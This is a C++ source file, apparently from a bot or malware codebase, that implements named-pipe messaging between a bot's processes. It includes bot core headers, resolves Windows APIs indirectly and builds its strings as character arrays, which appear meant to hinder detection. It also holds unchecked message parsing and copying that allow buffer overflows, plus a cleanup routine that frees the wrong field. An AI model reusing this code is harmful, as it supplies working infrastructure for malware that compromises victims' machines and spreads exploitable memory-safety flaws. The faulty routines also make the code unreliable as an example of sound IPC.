//---------------------------------------------------------------------------


#pragma hdrstop

#include "Pipes.h"
#include "BotCore.h"
#include "BotDebug.h"

//---------------------------------------------------------------------------


// Путь к директории каналов
char PipesPath[] = {'\\', '\\', '.', '\\', 'p', 'i', 'p', 'e', '\\',  0};;

// Префикс каналов бота
char BotPipePrefix[] = {'b', 't', 'p', 'i', 'p', 'e', 's',  0};


//********************************************************************
//  Внутренние методы для работы с каналами
//********************************************************************

namespace PIPE
{
	// Размер буфера приёма данных
	#define IN_BUF_SIZE 4096

	// Размер буфера отправки данных
	#define OUT_BUF_SIZE 4096

	// Парметры канала
	#define PIPE_PARAMS PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT

	// Сигнатура сообщения
	#define MESSAGE_SIGNATURE 0xDD047556

	// Версия сообщения
	#define MESSAGE_VERSION 0x00000001


    char OkResponse[] = {'o','k', 0};


    char CommandPing[] = {'p','i','n','g', 0};

	// Структура хранения информации о зарегистрированном обработчике
	typedef struct THandlerRec
	{
    	LPVOID Data;
		PCHAR Message;
		DWORD MessageHash;
		TPipeMessageHandler Handler;

	} *PHandlerRec;
	//------------------------------------------------------------------------

	// Функция возвращает полное имя канала
	PCHAR GetFullName(PCHAR Name);

	// Функция потока ожидания данных в канале
	DWORD WINAPI PipeThreadProc(LPVOID Data);

	// Функция формирует сообщение
    LPBYTE FormatMessage(PCHAR Message, DWORD Size);

	// Обработать сообщение пришедшее по каналу
	void ProcessMessage(PProcessPipe Pipe, PCHAR Msg, DWORD MsgSize, PCHAR Answer, int& AnswerSize );

    // Функция запаковывает сообщение
	LPBYTE PackMessage(LPBYTE OutBuf, DWORD BufSize, PCHAR PipeMessage, PCHAR Data, DWORD DataSize, DWORD PID, PCHAR ProcessName, DWORD &OutSize);

	// Функция распаковывает сообщение
	bool UnPackMessage(PCHAR Buf, DWORD BufSize, PPipeMessage Message);

	// Функция копирует сообщение
	void CopyMessage(PPipeMessage Source, PPipeMessage Destination);
}


//********************************************************************

PCHAR PIPE::GetFullName(PCHAR Name)
{
	// Функция возвращает полное имя канала
	if (STR::IsEmpty(Name))
		return NULL;
	return STR::New(3, PipesPath, BotPipePrefix, Name);
}
//-----------------------------------------------------------------------------

DWORD WINAPI PIPE::PipeThreadProc(LPVOID Data)
{
	// Функция потока ожидания данных в канале
	PProcessPipe Chanal = (PProcessPipe)Data;

	// Создаём канал
	Chanal->Handle = Create(Chanal->Name);

	bool Invalid = Chanal->Handle == NULL;

	// Уведомляем метод, создатель, об окончании инициализации
    pSetEvent(Chanal->Event);

	if (Invalid) return 0;

	PCHAR Buf = STR::Alloc(IN_BUF_SIZE + 1);
	PCHAR Answer = STR::Alloc(IN_BUF_SIZE + 1);

	// Запускаем цикл ожидания клиентов
 	while(!Chanal->Terminated)
	{
		// Ожидаем подключения клиента
		BOOL Connected = (BOOL)pConnectNamedPipe(Chanal->Handle, NULL);

		/* TODO : Сделать обработку ошибки подключения клиента канала */
		if (!Connected)
		{
			return 0;
		}

		// Запускаем цикл чтения комманд
		while (!Chanal->Terminated)
		{
			m_memset(Buf, 0, IN_BUF_SIZE + 1);
			DWORD Readed = 0;
			// Ожидаем поступления данных в файл
			if (pReadFile(Chanal->Handle, Buf, IN_BUF_SIZE, &Readed, NULL))
			{
				// Обрабатываем сообщение
				int AnswerSize;
				ProcessMessage(Chanal, Buf, Readed, Answer, AnswerSize);

				// Уведомляем клиента о прочитанном сообщении
				DWORD OutMsgSize = 0;

				PackMessage((LPBYTE)Buf, IN_BUF_SIZE, OkResponse, Answer, AnswerSize, 0, NULL, OutMsgSize);

				pWriteFile(Chanal->Handle, Buf, OutMsgSize, &Readed, NULL);
			}
			else
			{
				break;
			}
		}

		pDisconnectNamedPipe(Chanal->Handle);
	}

	STR::Free(Buf);
	STR::Free(Answer);

	pCloseHandle(Chanal->Handle);

	pSetEvent(Chanal->Event);

	return 0;
}
//-----------------------------------------------------------------------------

void PIPE::ProcessMessage(PProcessPipe Pipe, PCHAR Msg, DWORD MsgSize, PCHAR Answer, int& AnswerSize )
{
	// Обработать сообщение пришедшее по каналу
	if (STR::IsEmpty(Msg) || MsgSize == 0)
		return;
	// Разбираем сообщение
	TPipeMessage Message;
	if (!UnPackMessage(Msg, MsgSize, &Message))
		return;
	// Вызываем обработчики сообщений
	pEnterCriticalSection(&Pipe->Lock);

    bool Cancel = false;

	for (DWORD i = 0; i < List::Count(Pipe->Handlers); i++)
	{
		PHandlerRec Rec = (PHandlerRec)List::GetItem(Pipe->Handlers, i);

		if (!STR::IsEmpty(Rec->Message))
		{
			// Проверяем текст сообщения
			if (!StrSame(Rec->Message, Message.Message, true, 0))
				continue;
		}
		else
		if (Rec->MessageHash != 0)
		{
			// Проверяем хэш сообщения
			if (Rec->MessageHash != Message.MessageHash)
            	continue;
		}

		Rec->Handler(Rec->Data, &Message, Cancel);
		m_memcpy( Answer, Message.Data, Message.DataSize );
		AnswerSize = Message.DataSize;

		if (Cancel)
        	break;
	}

	pLeaveCriticalSection(&Pipe->Lock);

}
//-----------------------------------------------------------------------------

LPBYTE PIPE::PackMessage(LPBYTE OutBuf, DWORD BufSize, PCHAR PipeMessage, PCHAR Data, DWORD DataSize, DWORD PID, PCHAR ProcessName, DWORD &OutSize)
{

	OutSize = 0;

	if (PID == 0)
		PID = GetUniquePID();

	// Функция формирует сообщение
	LPBYTE Message = OutBuf;
	if (BufSize == 0)
		BufSize = OUT_BUF_SIZE;

	if (OutBuf == NULL)
		Message = (LPBYTE)MemAlloc(BufSize);

	m_memset(Message, 0, BufSize);

	if (Message == NULL)
    	return NULL;

	LPBYTE Buf = Message;

	#define AddDWORD(V) *(PDWORD)Buf = V; Buf += sizeof(DWORD)

	AddDWORD(MESSAGE_SIGNATURE); // Записываем сигнатуру
	AddDWORD(MESSAGE_VERSION);   // Записываем версию
	AddDWORD(PID);               // Записываем PID

	// Записываем размер имени процесса
	DWORD  PNS = StrCalcLength(ProcessName);
	AddDWORD(PNS);

	// Записываем имя процесса
	m_memcpy(Buf, ProcessName, PNS);
	Buf += PNS;

	// Записываем имя сообщения
    DWORD MsgSize = StrCalcLength(PipeMessage);
	AddDWORD(MsgSize);
	m_memcpy(Buf, PipeMessage, MsgSize + 1); // Добавляем нулевой символ
    Buf += MsgSize + 1;

	// Записываем данные сообщения
    AddDWORD(DataSize);
	m_memcpy(Buf, Data, DataSize);
	Buf += DataSize;

	OutSize = Buf - Message;
	OutSize++; // Завершающий ноль

	return Message;
}


bool PIPE::UnPackMessage(PCHAR Buf, DWORD BufSize, PPipeMessage Message)
{
	// Функция распаковывает сообщение
	if (Buf == NULL || BufSize == 0)
		return false;

	PCHAR Tmp = Buf;

	#define GetDWORD() *(PDWORD)Tmp; Tmp += sizeof(DWORD)

	ClearStruct(*Message);

	// Проверяем заголовок сообщения
	DWORD Signature = GetDWORD();
	DWORD Version   = GetDWORD();

	if (Signature != MESSAGE_SIGNATURE || Version != MESSAGE_VERSION)
		return false;

	// получаем информацию о процессе, отправителе
	Message->PID = GetDWORD();

	DWORD PNS = GetDWORD();
	Message->ProcessName = Tmp;
	Tmp += PNS;

	// Определяем сообщение
	Message->MsgSize     = GetDWORD();
	Message->Message     = Tmp;
    Tmp += Message->MsgSize + 1;
	Message->DataSize    = GetDWORD();
	Message->Data        = Tmp;

    Message->MessageHash = CalcHash(Message->Message);

	return true;
}

void PIPE::CopyMessage(PPipeMessage Source, PPipeMessage Destination)
{
	// Функция копирует сообщение
	if (Source == NULL || Destination == NULL)
		return;

    Destination->PID = Source->PID;

}

//********************************************************************

HANDLE PIPE::Create(PCHAR Name)
{
	// Функция создаёт объект именованного канала

	// Получаем имя канала
	PCHAR PipeName = GetFullName(Name);
	if (PipeName == NULL)
		return NULL;

	// Создаём канал
	HANDLE Handle = (HANDLE)pCreateNamedPipeA(
								PipeName,
								PIPE_ACCESS_DUPLEX,
								PIPE_PARAMS,
								PIPE_UNLIMITED_INSTANCES,
								IN_BUF_SIZE,
								OUT_BUF_SIZE, 5000, NULL);

	if (Handle == INVALID_HANDLE_VALUE)
    	Handle = NULL;

	// Освобождаем временные ресурсы
	STR::Free(PipeName);

	return Handle;
}
//-----------------------------------------------------------------------------

PProcessPipe PIPE::CreateProcessPipe(const PCHAR PipeName, bool StartPipe)
{
	// Функция создаёт глобальный канал процесса и запускает процесс
	// ожидания сообщений
	if (STR::IsEmpty(PipeName))
		return NULL;

	// Создаём структуру канала
	PProcessPipe Pipe = CreateStruct(TProcessPipe);
	if (Pipe == NULL)
		return NULL;

    // Инициализируем данные
	Pipe->Name = STR::New(PipeName);
	Pipe->Handlers = List::Create();
	pInitializeCriticalSection(&Pipe->Lock);


	if (!StartPipe)
		return Pipe;

    // Запускаем канал

	if (!StartProcessPipe(Pipe))
	{
    	// Произошла ошибка инициализации канала
		List::Free(Pipe->Handle);
		STR::Free(Pipe->Name);
		FreeStruct(Pipe);
		Pipe = NULL;
    }

	return Pipe;
}
//-----------------------------------------------------------------------------

bool PIPE::StartProcessPipe(PProcessPipe Pipe)
{
	//  Функция стартует работу канада
	if (Pipe == NULL)
		return false;

	if (Pipe->Handle != NULL)
		return true;

	Pipe->Event = (HANDLE)pCreateEventA(NULL, TRUE, FALSE, NULL);

	// Запускаем поток
	StartThread(PipeThreadProc, Pipe);


	// Ожидаем ответа потока об окончании инициализации
	pWaitForSingleObject(Pipe->Event, INFINITE);

	pCloseHandle(Pipe->Event);
	return Pipe->Handle != NULL;
}
//-----------------------------------------------------------------------------

void PIPE::FreeProcessPipe(PProcessPipe Pipe)
{
	//  FreeProcessPipe функция уничтожает пайп процесса
	if (Pipe == NULL)
		return;

	Pipe->Event = pCreateEventA(NULL, TRUE, FALSE, NULL);
	Pipe->Terminated = true;

	pWaitForSingleObject(Pipe->Event, INFINITE);

	pCloseHandle(Pipe->Event);
	FreeStruct(Pipe);
}

//-----------------------------------------------------------------------------

bool PIPE::SendMessage(PCHAR PipeName, PCHAR Msg, PCHAR Data, DWORD DataSize, void* Answer)
{
	// Функция отправляет указанному каналу сообщение
	if (Msg == NULL || STR::IsEmpty(PipeName))
		return false;

	// Получаем полное имя канала
	PCHAR Name = GetFullName(PipeName);
	if (Name == NULL)
		return false;

	if (DataSize == 0 && Data != NULL)
    	DataSize = StrCalcLength(Data);

	bool Result = false;
	for(;;)
	{
		// Открываем файл
		HANDLE Pipe = (HANDLE)pCreateFileA(Name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (Pipe != INVALID_HANDLE_VALUE)
		{
    		// Формируем сообщение
			DWORD OutSize = 0;
			LPBYTE OutMessage = PackMessage(NULL, 0, Msg, Data, DataSize, 0, NULL, OutSize);
			// Записываем данные
			if (OutMessage != NULL)
			{
				DWORD Writed = 0;
				pWriteFile(Pipe, OutMessage, OutSize, &Writed, NULL);
				MemFree(OutMessage);

				// Ожидаем ответ сервера
				if (Writed == OutSize)
				{
					PCHAR InBuf = STR::Alloc(IN_BUF_SIZE);
					DWORD Readed = 0;

					if ((BOOL)pReadFile(Pipe, InBuf, IN_BUF_SIZE, &Readed, NULL))
					{
						TPipeMessage Msg;
						ClearStruct(Msg);

						UnPackMessage(InBuf, Readed, &Msg);
                		Result = Readed != 0;
						if( Result && Answer )
							m_memcpy( Answer, Msg.Data, Msg.DataSize );
					}

					STR::Free(InBuf);
				}
			}

			// Закрываем файл
		    pCloseHandle(Pipe);
			break;
		}
		else
			if( pGetLastError() == ERROR_PIPE_BUSY )
				pSleep(1);
			else
				break;
			
	}

	STR::Free(Name);
	return Result;
}
//-----------------------------------------------------------------------------

bool PIPE::SendMessage(PCHAR PipeName, PCHAR Msg)
{
	return PIPE::SendMessage(PipeName, Msg, NULL, 0, NULL);
}
//-----------------------------------------------------------------------------


DWORD PIPE::Ping(PCHAR PipeName)
{
	//  Функция процеряет существование канала PipeName
	if (STR::IsEmpty(PipeName))
		return false;

	return PIPE::SendMessage(PipeName, CommandPing);
}

//-----------------------------------------------------------------------------

bool PIPE::RegisterMessageHandler(PProcessPipe Pipe, TPipeMessageHandler Handler,
							LPVOID Data, PCHAR Message, DWORD MessageHash)
{
	// Функция регистрирует обработчик сообщения
	if (Pipe == NULL || Handler == NULL)
		return false;

	PHandlerRec Rec = CreateStruct(THandlerRec);
	if (Rec == NULL)
		return false;

	Rec->Data = Data;
	Rec->Handler = Handler;
	Rec->Message = STR::New(Message);
    Rec->MessageHash = MessageHash;

	pEnterCriticalSection(&Pipe->Lock);

    List::Add(Pipe->Handlers, Rec);

	pLeaveCriticalSection(&Pipe->Lock);
	return true;
}
